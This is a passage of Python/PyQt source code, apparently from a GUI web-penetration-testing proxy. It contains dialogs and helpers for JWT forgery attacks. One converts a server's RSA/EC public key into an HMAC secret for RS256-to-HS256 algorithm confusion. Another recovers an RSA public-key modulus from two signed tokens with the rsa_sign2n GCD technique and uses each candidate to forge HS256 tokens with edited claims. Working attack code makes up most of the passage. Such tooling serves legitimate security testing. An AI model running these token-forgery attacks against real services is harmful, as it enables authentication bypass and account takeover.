            self._pem_display = QPlainTextEdit()
            self._pem_display.setReadOnly(True)
            self._pem_display.setMinimumHeight(110)
            self._pem_display.setMaximumHeight(150)
            self._pem_display.setFont(QFont(FONT_FAMILY_MONO, 9))
            self._pem_display.setStyleSheet(
                f"background:#0f1a0f;color:#a6e3a1;"
                f"border:1px solid {COLOR_BORDER};border-radius:3px;"
                f"padding:3px 5px;"
            )
            pem_row.addWidget(self._pem_display)
            copy_pem_btn = QPushButton("Copy")
            copy_pem_btn.setFixedWidth(54)
            copy_pem_btn.clicked.connect(
                lambda: QApplication.clipboard().setText(
                    self._pem_display.toPlainText()
                )
            )
            pem_row.addWidget(copy_pem_btn)
            layout.addLayout(pem_row)

            # Step 3 ──────────────────────────────────────────────────────
            step3_lbl = QLabel(
                "Step 3 — Symmetric Key  k  (Base64-encoded PEM):"
            )
            step3_lbl.setStyleSheet(
                f"color:#89b4fa;font-size:12px;font-weight:bold;"
            )
            layout.addWidget(step3_lbl)

            k_row = QHBoxLayout()
            k_row.setSpacing(6)
            self._k_display = QLineEdit()
            self._k_display.setReadOnly(True)
            self._k_display.setFont(QFont(FONT_FAMILY_MONO, 9))
            self._k_display.setStyleSheet(
                f"background:#0f0f1a;color:#cba6f7;"
                f"border:1px solid {COLOR_BORDER};border-radius:3px;"
                f"padding:3px 5px;"
            )
            self._k_display.setPlaceholderText(
                "← click  Convert Key ▶  to derive"
            )
            k_row.addWidget(self._k_display)
            copy_k_btn = QPushButton("Copy")
            copy_k_btn.setFixedWidth(54)
            copy_k_btn.clicked.connect(
                lambda: QApplication.clipboard().setText(self._k_display.text())
            )
            k_row.addWidget(copy_k_btn)
            layout.addLayout(k_row)

            k_hint = QLabel(
                "ℹ  Use this  k  value when manually creating a 'New Symmetric Key' "
                "in JWT Editor — replace the auto-generated  k  with this string."
            )
            k_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:10px;")
            k_hint.setWordWrap(True)
            layout.addWidget(k_hint)

            # Point the legacy accessor at _pem_display so get_extra_params() works
            self._pubkey_edit = self._pem_display

        # ── Buttons ────────────────────────────────────────────────────────
        sep4 = QFrame()
        sep4.setFrameShape(QFrame.HLine)
        sep4.setFixedHeight(1)
        sep4.setStyleSheet(f"background:{COLOR_BORDER};border:none;")
        layout.addWidget(sep4)

        btn_row = QHBoxLayout()
        btn_row.addStretch()

        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        btn_row.addWidget(cancel_btn)

        apply_btn = QPushButton("⚡ Apply Attack")
        apply_btn.setStyleSheet(
            "QPushButton{background:#1a0a0a;color:#f38ba8;"
            "border:1px solid #7a3030;border-radius:3px;"
            "font-size:12px;padding:5px 16px;font-weight:700;}"
            "QPushButton:hover{background:#2a1010;}"
        )
        apply_btn.setDefault(True)
        apply_btn.clicked.connect(self.accept)
        btn_row.addWidget(apply_btn)

        layout.addLayout(btn_row)

    # ── Result accessors ───────────────────────────────────────────────────

    def get_payload_overrides(self) -> dict:
        """Return {claim: parsed_value} from the editable table."""
        overrides: dict = {}
        for row, k in enumerate(self._claim_keys):
            item = self._table.item(row, 1)
            val_str = item.text().strip() if item else ""
            try:
                overrides[k] = json.loads(val_str)
            except Exception:
                overrides[k] = val_str
        return overrides

    def get_selected_km_key(self) -> Optional[dict]:
        """Return the key_data dict selected in the RSA key combo, or None for ephemeral."""
        if self._km_key_combo is None:
            return None
        idx = self._km_key_combo.currentData()
        if idx is None or idx < 0 or idx >= len(self._km_rsa_keys):
            return None
        return self._km_rsa_keys[idx]

    def get_extra_params(self) -> dict:
        params: dict = {}
        if self._url_edit is not None:
            params["url"] = self._url_edit.text().strip()
        if self._pubkey_edit is not None:
            # If caller converted, _pem_display has the normalised PEM.
            # If not converted yet, fall back and try auto-converting now.
            pem = self._pubkey_edit.toPlainText()
            if not pem.strip() and self._pubkey_input is not None:
                self._do_convert_key()
                pem = self._pubkey_edit.toPlainText()
            # Preserve the trailing newline — it's part of the PEM bytes
            # that the k value base64-encodes; stripping would break consistency.
            params["pubkey"] = pem
        return params

    # ── Algorithm confusion: key conversion helpers ────────────────────────

    @staticmethod
    def _jwk_pub_to_pem(jwk_str: str) -> str:
        """Convert a JWK (or JWKS with single key) to a PEM public key string."""
        try:
            from cryptography.hazmat.primitives.serialization import (
                Encoding, PublicFormat,
            )
            from cryptography.hazmat.backends import default_backend
        except ImportError as exc:  # pragma: no cover
            raise RuntimeError(
                "The 'cryptography' package is required for JWK conversion.\n"
                f"Install it with:  pip install cryptography\n({exc})"
            ) from exc

        data = json.loads(jwk_str)
        # Unwrap JWKS envelope
        if isinstance(data, dict) and "keys" in data:
            data = data["keys"][0]

        kty = data.get("kty", "").upper()

        def _b64u_to_int(s: str) -> int:
            pad = 4 - len(s) % 4
            b = base64.urlsafe_b64decode(s + ("=" * pad if pad != 4 else ""))
            return int.from_bytes(b, "big")

        if kty == "RSA":
            from cryptography.hazmat.primitives.asymmetric.rsa import (
                RSAPublicNumbers,
            )
            n = _b64u_to_int(data["n"])
            e = _b64u_to_int(data["e"])
            pub = RSAPublicNumbers(e, n).public_key(default_backend())
            return pub.public_bytes(
                Encoding.PEM, PublicFormat.SubjectPublicKeyInfo
            ).decode("ascii")

        elif kty == "EC":
            from cryptography.hazmat.primitives.asymmetric.ec import (
                EllipticCurvePublicNumbers,
                SECP256R1, SECP384R1, SECP521R1,
            )
            crv_map = {
                "P-256": SECP256R1(),
                "P-384": SECP384R1(),
                "P-521": SECP521R1(),
            }
            crv = crv_map.get(data.get("crv", ""))
            if crv is None:
                raise ValueError(f"Unsupported EC curve: {data.get('crv')}")
            x = _b64u_to_int(data["x"])
            y = _b64u_to_int(data["y"])
            pub = EllipticCurvePublicNumbers(x, y, crv).public_key(
                default_backend()
            )
            return pub.public_bytes(
                Encoding.PEM, PublicFormat.SubjectPublicKeyInfo
            ).decode("ascii")

        else:
            raise ValueError(f"Unsupported JWK key type: {kty!r}")

    def _do_convert_key(self) -> None:
        """
        Read the raw input (JWK or PEM), convert to a normalised PEM, and
        populate the derived-PEM display and the Base64-encoded k display.
        """
        if self._pubkey_input is None:
            return

        raw = self._pubkey_input.toPlainText().strip()
        if not raw:
            self._set_convert_status("⚠ No key pasted", error=True)
            return

        pem: str | None = None

        # ── Try JWK ───────────────────────────────────────────────────────
        if raw.startswith("{") or raw.startswith("["):
            try:
                pem = self._jwk_pub_to_pem(raw)
            except Exception as exc:
                self._set_convert_status(f"✗ JWK parse error: {exc}", error=True)
                return

        # ── Try PEM (normalise via cryptography) ──────────────────────────
        if pem is None:
            try:
                from cryptography.hazmat.primitives.serialization import (
                    load_pem_public_key, Encoding, PublicFormat,
                )
                from cryptography.hazmat.backends import default_backend
                pub = load_pem_public_key(raw.encode(), backend=default_backend())
                pem = pub.public_bytes(
                    Encoding.PEM, PublicFormat.SubjectPublicKeyInfo
                ).decode("ascii")
            except Exception as exc:
                self._set_convert_status(
                    f"✗ Unrecognised key format: {exc}", error=True
                )
                return

        # Normalise: strip leading/trailing whitespace then add exactly one
        pem = pem.strip() + "\n"
        # Base64-encode the raw PEM bytes → this is the symmetric-key k value.
        # Decoding k later gives the same bytes used as the HMAC-SHA256 secret.
        k_val = base64.b64encode(pem.encode("utf-8")).decode("ascii")

        self._pem_display.setPlainText(pem)
        self._k_display.setText(k_val)
        self._set_convert_status("✓ Key converted", error=False)

    def _set_convert_status(self, msg: str, *, error: bool) -> None:
        if not hasattr(self, "_convert_status_lbl"):
            return
        colour = "#f38ba8" if error else "#a6e3a1"
        self._convert_status_lbl.setText(msg)
        self._convert_status_lbl.setStyleSheet(f"color:{colour};font-size:11px;")

    def accept(self) -> None:  # type: ignore[override]
        """Auto-convert the key before accepting, if conversion hasn't been done."""
        if (
            self._pubkey_input is not None
            and self._pem_display is not None
            and not self._pem_display.toPlainText().strip()
            and self._pubkey_input.toPlainText().strip()
        ):
            self._do_convert_key()
            # If conversion failed (display still empty) block acceptance
            if not self._pem_display.toPlainText().strip():
                return
        super().accept()


# ─────────────────────────────────────────────────────────────────────────────
# recover RSA public key modulus from two RS256 signed tokens
# ─────────────────────────────────────────────────────────────────────────────
#
# Technique: given two valid RS256 JWT tokens signed with the same private key,
# the RSA public-key modulus n can be recovered as the GCD of the two values
#   (s1^e − PKCS1v15_padded_hash(msg1)) and (s2^e − PKCS1v15_padded_hash(msg2))
# because n divides both.  Small prime factors are stripped from the GCD until
# only the modulus (or a small multiple) remains.  Each candidate n is then
# formatted as an X.509 SubjectPublicKeyInfo PEM and used as the HMAC-SHA256
# secret to produce an alg=HS256 forged token.
#
# WARNING: pow(sig, 65537) is computed over unbounded integers — numbers are
# ~16 MB for 2048-bit keys.  The computation runs in a separate process to
# avoid freezing the UI.  With gmpy2/GMP this takes 5–30 s; without it the
# pure-Python Karatsuba path is 100× slower and will likely time out.
# Install gmpy2:  pip install gmpy2   (Debian/Ubuntu: sudo apt install python3-gmpy2)

_SIGN2N_SHA256_DIGESTINFO = bytes.fromhex('3031300d060960864801650304020105000420')

# Module-level gmpy2 probe — used by _sign2n_candidates and the dialog banner.
try:
    import gmpy2 as _gmpy2_lib
    _GMPY2_AVAILABLE: bool = True
except ImportError:
    _gmpy2_lib = None  # type: ignore[assignment]
    _GMPY2_AVAILABLE = False


def _s2n_asn1_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    else:
        return bytes([0x82, n >> 8, n & 0xff])


def _s2n_asn1_int(n_int: int) -> bytes:
    nb = n_int.to_bytes((n_int.bit_length() + 7) // 8, 'big')
    if nb[0] & 0x80:
        nb = b'\x00' + nb
    return b'\x02' + _s2n_asn1_len(len(nb)) + nb


def _s2n_asn1_seq(body: bytes) -> bytes:
    return b'\x30' + _s2n_asn1_len(len(body)) + body


def _s2n_n_to_pem(n: int, e: int = 65537) -> str:
    """Encode RSA (n, e) as an X.509 SubjectPublicKeyInfo PEM string."""
    import base64 as _b64
    rsa_pub_key = _s2n_asn1_seq(_s2n_asn1_int(n) + _s2n_asn1_int(e))
    # AlgorithmIdentifier: OID rsaEncryption + NULL
    rsa_oid = b'\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00'
    alg_id = _s2n_asn1_seq(rsa_oid)
    bit_str = b'\x03' + _s2n_asn1_len(len(rsa_pub_key) + 1) + b'\x00' + rsa_pub_key
    spki = _s2n_asn1_seq(alg_id + bit_str)
    b64 = _b64.b64encode(spki).decode()
    lines = '\n'.join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n"


def _sign2n_candidates(jwt1: str, jwt2: str) -> list:
    """
    Given two RS256-signed JWTs (same RSA key, different payloads), recover
    candidate RSA public-key PEM strings using the rsa_sign2n technique.
    Returns a list of PEM strings (one per candidate modulus).
    Raises ValueError with an explanatory message on failure.
    """
    import base64 as _b64, hashlib as _hs
    from math import gcd as _pygcd

    # Fast path: GMP (via gmpy2) uses FFT-based multiplication for huge bignums
    # — the same backend used by the portswigger/sig2n Docker tool.  Without it,
    # pure-Python Karatsuba on ~16 MB intermediates is ~100× slower and times out.
    if _GMPY2_AVAILABLE and _gmpy2_lib is not None:
        def _pow_e(x: int) -> int:
            return int(_gmpy2_lib.mpz(x) ** 65537)
        def _gcd(a: int, b: int) -> int:
            return int(_gmpy2_lib.gcd(_gmpy2_lib.mpz(a), _gmpy2_lib.mpz(b)))
    else:
        def _pow_e(x: int) -> int:   # type: ignore[misc]
            return pow(x, 65537)
        _gcd = _pygcd

    def _b64d(s: str) -> bytes:
        s += '=' * (-len(s) % 4)
        return _b64.urlsafe_b64decode(s)

    def _parse(tok: str):
        parts = tok.strip().split('.')
        if len(parts) != 3:
            raise ValueError("Not a valid 3-part JWT")
        return _b64d(parts[2]), f"{parts[0]}.{parts[1]}".encode('ascii')

    sig1, msg1 = _parse(jwt1)
    sig2, msg2 = _parse(jwt2)

    if sig1 == sig2:
        raise ValueError("Tokens have identical signatures — use two tokens with different payloads")
    if len(sig1) != len(sig2):
        raise ValueError(
            f"Signature lengths differ ({len(sig1)} vs {len(sig2)} bytes) — "
            "tokens must use the same RSA key size"
        )

    key_len = len(sig1)  # e.g. 256 bytes for 2048-bit RSA
    e = 65537

    def _pkcs1_pad(msg: bytes) -> int:
        h = _hs.sha256(msg).digest()
        di = _SIGN2N_SHA256_DIGESTINFO + h
        pad = key_len - len(di) - 3
        if pad < 8:
            raise ValueError("Key size too small to construct PKCS#1 v1.5 padding")
        padded = b'\x00\x01' + b'\xff' * pad + b'\x00' + di
        return int.from_bytes(padded, 'big')

    s1 = int.from_bytes(sig1, 'big')
    s2 = int.from_bytes(sig2, 'big')
    m1 = _pkcs1_pad(msg1)
    m2 = _pkcs1_pad(msg2)

    # n | gcd(s1^e − m1,  s2^e − m2)   (computed over unbounded integers)
    diff1 = _pow_e(s1) - m1
    diff2 = _pow_e(s2) - m2
    g = abs(_gcd(diff1, diff2))

    if g <= 1:
        raise ValueError(
            "GCD = 1 — could not recover a common factor.  "
            "Ensure both tokens are signed by the same RSA key."
        )

    # Strip small prime factors to isolate the RSA modulus (or a small multiple)
    candidates: set = set()
    for p in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]:
        while g % p == 0:
            g //= p
            if g.bit_length() >= 512:
                candidates.add(g)
    candidates.add(g)

    pems: list = []
    seen: set = set()
    for n in sorted(candidates, key=lambda x: x.bit_length(), reverse=True):
        if n.bit_length() < 512:
            continue
        pem = _s2n_n_to_pem(n)
        if pem not in seen:
            seen.add(pem)
            pems.append(pem)

    if not pems:
        raise ValueError("No valid RSA modulus candidates recovered (all candidates < 512 bits)")
    return pems


# ── Subprocess worker (module-level so multiprocessing can fork it) ──────────

def _sign2n_subprocess_worker(jwt1: str, jwt2: str, q) -> None:
    """Runs inside a forked subprocess — puts ('ok', pems) or ('err', msg) into q."""
    try:
        pems = _sign2n_candidates(jwt1, jwt2)
        q.put(('ok', pems))
    except Exception as exc:
        q.put(('err', str(exc)))


# ── Background thread — launches a subprocess for the heavy GCD work ─────────
#
# Why a subprocess and not a thread?
# pow(s, 65537) on a 2048-bit bignum is implemented entirely in CPython's C
# layer and never releases the GIL.  Running it in a QThread therefore blocks
# ALL Python execution in the main process — including Qt's Python event
# handlers — making the app appear frozen.  A separate *process* has its own
# GIL so the main process stays fully responsive.  The QThread only calls
# Process.join() which is an OS-level wait that yields the GIL immediately.

class _Sign2nComputeThread(QThread):
    """Launches _sign2n_candidates in a subprocess and relays the result."""
    finished = pyqtSignal(list)   # list of PEM strings on success
    error    = pyqtSignal(str)    # error message on failure

    def __init__(self, jwt1: str, jwt2: str, parent=None):
        super().__init__(parent)
        self._jwt1  = jwt1
        self._jwt2  = jwt2
        self._proc  = None   # multiprocessing.Process

    def stop(self) -> None:
        """Terminate the subprocess (called from the UI when the user cancels)."""
        try:
            if self._proc is not None and self._proc.is_alive():
                self._proc.terminate()
        except Exception:
            pass

    def run(self) -> None:
        import multiprocessing as _mp
        try:
            ctx = _mp.get_context('fork')   # Linux default — no re-import needed
            q   = ctx.Queue()
            self._proc = ctx.Process(
                target=_sign2n_subprocess_worker,
                args=(self._jwt1, self._jwt2, q),
                daemon=True,
            )
            self._proc.start()
            self._proc.join(timeout=360)     # 6-minute hard ceiling
            if self._proc.is_alive():
                self._proc.terminate()
                self.error.emit("Computation timed out (> 6 min) — try shorter / weaker tokens")
                return
            try:
                import queue as _q
                kind, val = q.get_nowait()
            except Exception:
                self.error.emit("Subprocess produced no result — possible crash or cancellation")
                return
            if kind == 'ok':
                self.finished.emit(val)
            else:
                self.error.emit(val)
        except Exception as exc:
            self.error.emit(f"Failed to start computation subprocess: {exc}")


# ── Dialog: collect two tokens, show candidate keys ──────────────────────────

class _Sign2nDialog(QDialog):
    """
    Dialog for the rsa_sign2n RS256→HS256 algorithm-confusion attack.
    Accepts two valid RS256 JWT tokens (same RSA key, different payloads) and
    recovers candidate RSA public-key PEMs to use as HMAC secrets.
    """

    def __init__(self, payload: dict = None, parent=None):
        super().__init__(parent)
        self.setWindowTitle("RS256 → HS256  ·  rsa_sign2n  (recover pubkey from 2 tokens)")
        self.setMinimumSize(740, 680)
        self.setStyleSheet(
            f"background:{COLOR_CARD_BG}; color:{COLOR_TEXT};"
        )
        self._candidate_pems: list = []
        self._compute_thread: _Sign2nComputeThread | None = None
        self._elapsed_secs: int = 0
        self._progress_timer = QTimer(self)
        self._progress_timer.timeout.connect(self._tick_progress)
        self._payload: dict = payload or {}
        self._claim_keys: list = list(self._payload.keys())

        lay = QVBoxLayout(self)
        lay.setSpacing(8)
        lay.setContentsMargins(14, 14, 14, 14)

        # ── description ──────────────────────────────────────────────────
        desc = QLabel(
            "Paste two valid RS256 JWTs from the <b>same server</b> (same RSA key, "
            "different payloads).<br>"
            "The tool recovers the RSA public-key modulus by computing "
            "<tt>gcd(s₁ᵉ − hash₁, s₂ᵉ − hash₂)</tt> over unbounded integers, "
            "then uses each candidate key as the HMAC-SHA256 secret (alg=HS256)."
        )
        desc.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:11px; line-height:150%;")
        desc.setWordWrap(True)
        desc.setTextFormat(Qt.RichText)
        lay.addWidget(desc)

        # ── gmpy2 status banner ───────────────────────────────────────────
        if _GMPY2_AVAILABLE:
            _gmpy2_text = "⚡  gmpy2 / GMP detected — fast FFT bignum arithmetic (5–30 s per 2048-bit key)"
            _gmpy2_color = "#4caf50"
        else:
            _gmpy2_text = (
                "⚠  gmpy2 not found — computation will be VERY slow (30+ min) or time out.<br>"
                "Install: <tt>pip install gmpy2</tt>  "
                "(Debian/Ubuntu: <tt>sudo apt install python3-gmpy2</tt>)"
            )
            _gmpy2_color = "#e5c07b"
        _gmpy2_lbl = QLabel(_gmpy2_text)
        _gmpy2_lbl.setStyleSheet(
            f"color:{_gmpy2_color}; font-size:11px;"
            f" background:#1e2a1e; border:1px solid {_gmpy2_color};"
            f" border-radius:4px; padding:4px 8px;"
        )
        _gmpy2_lbl.setWordWrap(True)
        _gmpy2_lbl.setTextFormat(Qt.RichText)
        lay.addWidget(_gmpy2_lbl)

        # ── payload claims table ─────────────────────────────────────────
        _sep1 = QFrame()
        _sep1.setFrameShape(QFrame.HLine)
        _sep1.setFixedHeight(1)
        _sep1.setStyleSheet(f"background:{COLOR_BORDER};border:none;")
        lay.addWidget(_sep1)

        _pay_lbl = QLabel("Modify Payload Claims  (edit values before applying attack):")
        _pay_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_BRIGHT}; font-size:12px; font-weight:bold;"
        )
        lay.addWidget(_pay_lbl)

        self._table = QTableWidget(max(len(self._payload), 1), 2)
        self._table.setHorizontalHeaderLabels(["Claim", "Value"])
        self._table.setStyleSheet(
            f"QTableWidget{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};gridline-color:{COLOR_BORDER};"
            f"selection-background-color:#313244;}}"
            f"QTableWidget::item{{padding:4px 6px;}}"
            f"QHeaderView::section{{background:{COLOR_CARD_BG};color:{COLOR_TEXT_MUTED};"
            f"border:none;padding:4px 6px;font-size:11px;}}"
        )
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._table.verticalHeader().setVisible(False)
        self._table.setSelectionBehavior(QTableWidget.SelectRows)
        _tbl_h = min(200, 40 + 32 * max(len(self._payload), 1))
        self._table.setMaximumHeight(_tbl_h)
        self._table.setMinimumHeight(60)

        for row, (k, v) in enumerate(self._payload.items()):
            key_item = QTableWidgetItem(str(k))
            key_item.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)
            key_item.setForeground(QColor("#89b4fa"))
            self._table.setItem(row, 0, key_item)
            if isinstance(v, (dict, list)):
                val_str = json.dumps(v)
            elif v is None:
                val_str = "null"
            elif isinstance(v, bool):
                val_str = "true" if v else "false"
            else:
                val_str = str(v)
            self._table.setItem(row, 1, QTableWidgetItem(val_str))

        if not self._payload:
            _empty_item = QTableWidgetItem("(no JWT loaded in the request panel)")
            _empty_item.setFlags(Qt.ItemIsEnabled)
            _empty_item.setForeground(QColor(COLOR_TEXT_MUTED))
            self._table.setItem(0, 0, _empty_item)

        lay.addWidget(self._table)

        _sep2 = QFrame()
        _sep2.setFrameShape(QFrame.HLine)
        _sep2.setFixedHeight(1)
        _sep2.setStyleSheet(f"background:{COLOR_BORDER};border:none;")
        lay.addWidget(_sep2)

        # ── token inputs ──────────────────────────────────────────────────
        _mono = QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8)
        _edit_style = (
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )

        lbl1 = QLabel("Token 1  — first valid RS256 JWT:")
        lbl1.setStyleSheet(f"color:{COLOR_TEXT_BRIGHT}; font-size:12px; font-weight:bold;")
        lay.addWidget(lbl1)
        self._tok1_edit = QPlainTextEdit()
        self._tok1_edit.setPlaceholderText(
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.<sig1>"
        )
        self._tok1_edit.setMaximumHeight(72)
        self._tok1_edit.setFont(_mono)
        self._tok1_edit.setStyleSheet(_edit_style)
        lay.addWidget(self._tok1_edit)

        lbl2 = QLabel("Token 2  — second valid RS256 JWT (different payload/claims):")
        lbl2.setStyleSheet(f"color:{COLOR_TEXT_BRIGHT}; font-size:12px; font-weight:bold;")
        lay.addWidget(lbl2)
        self._tok2_edit = QPlainTextEdit()
        self._tok2_edit.setPlaceholderText(
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMiJ9.<sig2>"
        )
        self._tok2_edit.setMaximumHeight(72)
        self._tok2_edit.setFont(_mono)
        self._tok2_edit.setStyleSheet(_edit_style)
        lay.addWidget(self._tok2_edit)

        # ── extract button + status ───────────────────────────────────────
        ext_row = QHBoxLayout()
        ext_row.setSpacing(8)
        self._extract_btn = QPushButton("⚙  Extract Public Key(s)")
        self._extract_btn.setStyleSheet(
            f"QPushButton {{background:{COLOR_ACCENT}; color:#fff; border:none;"
            f" border-radius:4px; padding:6px 18px; font-weight:bold; font-size:11px;}}"
            f"QPushButton:hover {{background:#5499e0;}}"
            f"QPushButton:disabled {{background:#3a3a4a; color:{COLOR_TEXT_MUTED};}}"
        )
        self._extract_btn.clicked.connect(self._start_extraction)
        ext_row.addWidget(self._extract_btn)
        self._cancel_btn = QPushButton("✕  Cancel")
        self._cancel_btn.setEnabled(False)
        self._cancel_btn.setStyleSheet(
            f"QPushButton {{background:#5a2a2a; color:{COLOR_TEXT_BRIGHT}; border:none;"
            f" border-radius:4px; padding:6px 14px; font-weight:bold; font-size:11px;}}"
            f"QPushButton:hover {{background:#7a3a3a;}}"
            f"QPushButton:disabled {{background:#3a3a4a; color:{COLOR_TEXT_MUTED};}}"
        )
        self._cancel_btn.clicked.connect(self._cancel_extraction)
        ext_row.addWidget(self._cancel_btn)
        self._status_lbl = QLabel("")
        self._status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:11px;")
        ext_row.addWidget(self._status_lbl, 1)
        lay.addLayout(ext_row)

        # ── results view ──────────────────────────────────────────────────
        res_lbl = QLabel(
            "Candidate public-key PEMs  (each will be used as HMAC-SHA256 secret):"
        )
        res_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:11px;")
        lay.addWidget(res_lbl)
        self._results_view = QPlainTextEdit()
        self._results_view.setReadOnly(True)
        self._results_view.setFont(_mono)
        self._results_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#98C379;"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        self._results_view.setPlaceholderText(
            "Recovered public key(s) will appear here after extraction…"
        )
        lay.addWidget(self._results_view, 1)

        # ── dialog buttons ────────────────────────────────────────────────
        btn_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        self._ok_btn = btn_box.button(QDialogButtonBox.Ok)
        self._ok_btn.setText("Apply Attack")
        self._ok_btn.setEnabled(False)
        self._ok_btn.setStyleSheet(
            f"QPushButton {{background:{COLOR_CRITICAL}; color:#fff; border:none;"
            f" border-radius:4px; padding:6px 18px; font-weight:bold;}}"
            f"QPushButton:hover {{background:#d9534f;}}"
            f"QPushButton:disabled {{background:#3a3a4a; color:{COLOR_TEXT_MUTED};}}"
        )
        btn_box.rejected.connect(self.reject)
        btn_box.accepted.connect(self.accept)
        lay.addWidget(btn_box)

    # ── internal helpers ──────────────────────────────────────────────────

    def _set_running(self, running: bool) -> None:
        """Toggle UI between idle and running states."""
        self._extract_btn.setEnabled(not running)
        self._cancel_btn.setEnabled(running)
        if not running:
            self._progress_timer.stop()
            self._elapsed_secs = 0

    def _tick_progress(self) -> None:
        self._elapsed_secs += 1
        if _GMPY2_AVAILABLE:
            hint = "gmpy2/GMP — expected 5–30 s"
        else:
            hint = "no gmpy2 — may take 30+ min; install gmpy2 for speed"
        self._status_lbl.setText(
            f"⏳  Computing…  {self._elapsed_secs}s  ({hint})"
        )

    def _start_extraction(self) -> None:
        tok1 = self._tok1_edit.toPlainText().strip()
        tok2 = self._tok2_edit.toPlainText().strip()
        if not tok1 or not tok2:
            self._status_lbl.setText("⚠  Paste both tokens first")
            return
        self._ok_btn.setEnabled(False)
        self._results_view.setPlainText("")
        self._candidate_pems = []
        self._elapsed_secs = 0
        self._status_lbl.setText("⏳  Starting subprocess…")
        self._set_running(True)
        self._progress_timer.start(1000)
        self._compute_thread = _Sign2nComputeThread(tok1, tok2, self)
        self._compute_thread.finished.connect(self._on_computed)
        self._compute_thread.error.connect(self._on_error)
        self._compute_thread.start()

    def _cancel_extraction(self) -> None:
        """Terminate the subprocess and reset the UI."""
        if self._compute_thread is not None:
            self._compute_thread.stop()
            self._compute_thread.quit()
        self._set_running(False)
        self._status_lbl.setText("⚠  Cancelled")

    def _on_computed(self, pems: list) -> None:
        self._candidate_pems = pems
        self._results_view.setPlainText('\n\n'.join(pems))
        self._set_running(False)
        self._status_lbl.setText(f"✅  Found {len(pems)} candidate key(s)")
        self._ok_btn.setEnabled(True)

    def _on_error(self, msg: str) -> None:
        self._set_running(False)
        self._status_lbl.setText(f"❌  {msg}")

    def reject(self) -> None:   # type: ignore[override]
        """Cancel any in-progress computation before closing."""
        self._cancel_extraction()
        super().reject()

    def get_candidate_pems(self) -> list:
        return list(self._candidate_pems)

    def get_payload_overrides(self) -> dict:
        """Return {claim: parsed_value} from the editable claims table."""
        overrides: dict = {}
        for row, k in enumerate(self._claim_keys):
            item = self._table.item(row, 1)
            val_str = item.text().strip() if item else ""
            try:
                overrides[k] = json.loads(val_str)
            except Exception:
                overrides[k] = val_str
        return overrides


# ─────────────────────────────────────────────────────────────────────────────
# Single Repeater Tab (one request/response pair)
# ─────────────────────────────────────────────────────────────────────────────

class RepeaterInstance(QWidget):
    """One 'tab' inside the Repeater — holds request editor + response viewer."""

    def __init__(self, name: str = "Tab 1", parent=None):
        super().__init__(parent)
        self.name          = name
        self._history: List[Dict] = []   # list of {request, response, elapsed, size}
        self._history_pos  = -1
        self._send_thread: Optional[HttpSendThread] = None
        self._introspection_pending = False   # set True when introspection request is sent
        self._bypass_thread = None            # _IntroBypassThread instance
        # AI Payload Suggester state
        self._ai_suggest_thread: Optional[_AiPayloadSuggestThread] = None
        self._ai_exploit_thread: Optional[_AiExploitRunThread] = None
        self._ai_inject_template: str = ""   # request snapshot at generate time
        self._ai_inject_original: str = ""   # value being fuzzed (to replace with payloads)
        self._setup_ui()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _setup_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(4, 4, 4, 4)
        root.setSpacing(4)

        # ── Top toolbar ───────────────────────────────────────────────────────
        toolbar = QHBoxLayout()

        self.host_input = QLineEdit()
        self.host_input.setPlaceholderText("Host  (e.g. example.com)")
        self.host_input.setFixedWidth(260)
        self.host_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 8px;")

        self.port_input = QLineEdit("443")
        self.port_input.setFixedWidth(60)
        self.port_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 8px;")

        self.ssl_check = QCheckBox("HTTPS")
        self.ssl_check.setChecked(True)
        self.ssl_check.setStyleSheet(f"color:{COLOR_TEXT};")
        self.ssl_check.stateChanged.connect(self._toggle_port_default)

        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 120)
        self.timeout_spin.setValue(30)
        self.timeout_spin.setSuffix("s")
        self.timeout_spin.setFixedWidth(65)
        self.timeout_spin.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:2px;")

        self.send_btn = QPushButton("▶  Send")
        self.send_btn.setFixedHeight(32)
        self.send_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLOR_ACCENT};
                color: #fff; font-weight:700; border-radius:5px; padding:0 18px;
                font-size:13px;
            }}
            QPushButton:hover  {{ background-color:{COLOR_HOVER}; }}
            QPushButton:pressed{{ background-color:{COLOR_BORDER}; }}
            QPushButton:disabled{{ background-color:#555; color:#888; }}
        """)
        self.send_btn.clicked.connect(self._send_request)
        # Use a window-level shortcut so Ctrl+Enter works no matter which
        # widget has focus (button shortcuts stop working if focus moves away).
